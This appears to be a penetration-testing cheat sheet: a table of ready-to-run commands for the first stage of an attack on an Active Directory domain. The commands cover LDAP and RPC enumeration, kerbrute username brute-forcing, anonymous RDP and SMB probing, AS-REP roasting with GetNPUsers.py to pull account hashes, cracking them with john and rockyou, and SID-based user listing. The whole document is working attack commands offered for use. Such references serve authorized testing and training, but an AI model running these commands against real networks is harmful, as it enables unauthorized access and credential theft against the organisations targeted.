# Initial Scans

<table><thead><tr><th width="261">Info</th><th>Command</th></tr></thead><tbody><tr><td>Scan LDAP with nmap</td><td><code>nmap -p 389 -sC -sV $ip</code></td></tr><tr><td>LDAP Enumeration</td><td><code>ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip"</code></td></tr><tr><td>Get User account &#x26; description field</td><td><code>ldapsearch -v -x -b "DC=domain,DC=local" -H "ldap://$ip" | grep 'sAMAccountName|description'</code></td></tr><tr><td>Get User accounts</td><td><code>rpcclient -U% $ip; enumdomusers; enumdomains; enumprivs</code></td></tr><tr><td>Quick Bruteforce scan for valid usernames</td><td><code>kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain $domain -dc-ip $ip</code></td></tr><tr><td>Extensive Bruteforce scan for valid usernames</td><td><code>kerbrute -users /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -domain $domain -dc-ip $ip</code></td></tr><tr><td>Extensive Bruteforce scan for valid usernames</td><td><code>kerbrute -users /usr/share/wordlists/names.txt -domain DICTIONARY -dc-ip $ip</code></td></tr><tr><td>Userless RDP session / See who is logged on / lock screen info</td><td><code>rdesktop -f -u "" $ip</code></td></tr><tr><td>Get Password Policy</td><td><code>crackmapexec smb $ip --pass-pol -u '' -p ''</code></td></tr><tr><td>Get Hashes if anon access allowed</td><td><code>GetNPUsers.py $domain/ -format john -outputfile hash</code></td></tr><tr><td>List and get TGTs for those users without preauth set</td><td><code>GetNPUsers.py brute.csl/ -usersfile users.txt -format john -outputfile hash</code></td></tr><tr><td>Crack Hashes</td><td><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></td></tr><tr><td>Get users from IPC$ share</td><td><code>python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@$ip | tee users.txt</code></td></tr></tbody></table>
